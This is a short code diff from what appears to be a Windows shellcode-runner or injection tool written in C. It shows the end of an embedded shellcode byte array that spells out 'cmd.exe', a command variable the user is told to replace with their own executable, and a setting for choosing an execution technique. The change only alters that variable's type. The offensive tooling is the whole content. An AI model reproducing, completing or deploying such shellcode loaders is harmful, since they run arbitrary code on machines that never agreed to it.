@@ -22,7 +22,7 @@ unsigned char sc[] =
 "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
 "\x2e\x65\x78\x65\x00";
 
-char* command_exe = "calc.exe"; //replace calc.exe with the path or command to run your exe
+TCHAR command_exe[260] = TEXT("calc.exe"); //replace calc.exe with the path or command to run your exe
 
 //choose technique
 int t_no = 1; //edit this DEFAULT IS 1
